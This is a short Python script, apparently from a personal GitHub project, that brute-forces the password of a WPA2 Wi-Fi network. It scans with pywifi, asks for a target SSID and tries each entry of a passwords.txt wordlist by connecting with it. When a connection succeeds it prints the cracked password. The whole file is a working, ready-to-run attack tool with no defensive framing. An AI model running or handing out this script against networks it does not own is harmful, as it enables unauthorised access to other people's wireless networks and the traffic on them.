# Author : Hunter87
# Github : https://github.com/hunter87ff
# Insta  : https://instagram.com/im_hunter87
# Youtube: https://youtube.com/@hunter87
lgr='\033[1;32m' 
red='\033[0;31m' 
cyan='\033[36m' 
blue='\033[34m'
NC='\033[0m'
import os, time, sys

def main():
    try:
        import pywifi
        from pywifi import PyWiFi, const, Profile
    except:
        print(f"{blue}Installing Packages")
        os.system("pip install -r requirements.txt")
    try:
        wifi = PyWiFi()
        ifaces = wifi.interfaces()[0]
        ifaces.scan()
        results = ifaces.scan_results()
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
    except Exception as e:
        print(f"{red}Error : {e}")
        sys.exit()

    def crack(ssid, password, number):
        pro = Profile() 
        pro.ssid = ssid
        pro.auth = const.AUTH_ALG_OPEN
        pro.akm.append(const.AKM_TYPE_WPA2PSK)
        pro.cipher = const.CIPHER_TYPE_CCMP
        pro.key = password
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(pro)
        time.sleep(0.1)
        iface.connect(tmp_profile)
        time.sleep(0.35)
        if ifaces.status() == const.IFACE_CONNECTED:
            time.sleep(1)
            print(f'{lgr}Cracked Successfully!')
            print(f'{lgr}Password : {password}{NC}')
            time.sleep(1)
            exit()
        else:
            print(f'{red}{number}) Crack Failed using {password}')

    def pwd(ssid, psws):
        number = 0
        for psw in psws:
            number += 1
            crack(ssid, str(psw), number)
             
    with open("passwords.txt", "r", encoding='utf8') as f:
        psws = f.read().strip().split("\n")
        target = input("Target SSID : ")
        pwd(target, psws)
